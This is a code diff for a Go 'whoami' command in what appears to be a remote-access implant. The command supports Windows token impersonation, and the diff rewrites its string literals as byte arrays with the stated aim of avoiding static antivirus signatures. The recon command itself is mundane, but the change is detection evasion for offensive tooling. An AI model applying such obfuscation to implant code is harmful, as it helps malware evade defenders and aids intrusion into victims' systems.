@@ -13,21 +13,30 @@ import (
 	"time"
 )
 
+// Whoami strings (constructed to avoid static signatures)
+var (
+	waCmdName   = string([]byte{0x77, 0x68, 0x6f, 0x61, 0x6d, 0x69})             // whoami
+	waWindows   = string([]byte{0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73})       // windows
+	waFlagV     = string([]byte{0x2d, 0x76})                                     // -v
+	waFlagG     = string([]byte{0x2d, 0x67})                                     // -g
+	waBackslash = string([]byte{0x5c})                                           // \
+)
+
 type WhoamiCommand struct{}
 
 func (c *WhoamiCommand) Name() string {
-	return "whoami"
+	return waCmdName
 }
 
 func (c *WhoamiCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	var output strings.Builder
 
 	// Check for Windows token impersonation first
-	if runtime.GOOS == "windows" {
+	if runtime.GOOS == waWindows {
 		// Use the stored metadata from the token store
 		if user, domain, isImpersonating := GetImpersonatedUser(ctx); isImpersonating {
 			output.WriteString(fmt.Sprintf("%s\\%s", domain, user))
-			if len(args) > 0 && args[0] == "-v" {
+			if len(args) > 0 && args[0] == waFlagV {
 				output.WriteString("|" + WImpersn)
 			}
 			return CommandResult{
@@ -52,9 +61,9 @@ func (c *WhoamiCommand) Execute(ctx *CommandContext, args []string) CommandResul
 		}
 	} else {
 		// Format based on OS
-		if runtime.GOOS == "windows" {
+		if runtime.GOOS == waWindows {
 			// Windows format: DOMAIN\Username
-			parts := strings.Split(currentUser.Username, "\\")
+			parts := strings.Split(currentUser.Username, waBackslash)
 			if len(parts) == 2 {
 				output.WriteString(currentUser.Username)
 			} else {
@@ -67,7 +76,7 @@ func (c *WhoamiCommand) Execute(ctx *CommandContext, args []string) CommandResul
 		}
 
 		// Add UID/GID info for verbose mode (compact format: v|uid|gid|home|shell)
-		if len(args) > 0 && args[0] == "-v" {
+		if len(args) > 0 && args[0] == waFlagV {
 			shell := os.Getenv(EnvShell())
 			if shell == "" {
 				shell = WUnknown
@@ -77,7 +86,7 @@ func (c *WhoamiCommand) Execute(ctx *CommandContext, args []string) CommandResul
 	}
 
 	// Add groups info if requested (compact format: g|group1,group2,group3)
-	if len(args) > 0 && args[0] == "-g" {
+	if len(args) > 0 && args[0] == waFlagG {
 		if currentUser != nil {
 			if groups, err := currentUser.GroupIds(); err == nil && len(groups) > 0 {
 				output.WriteString(fmt.Sprintf("\n%s|%s", WGroups, strings.Join(groups, ",")))
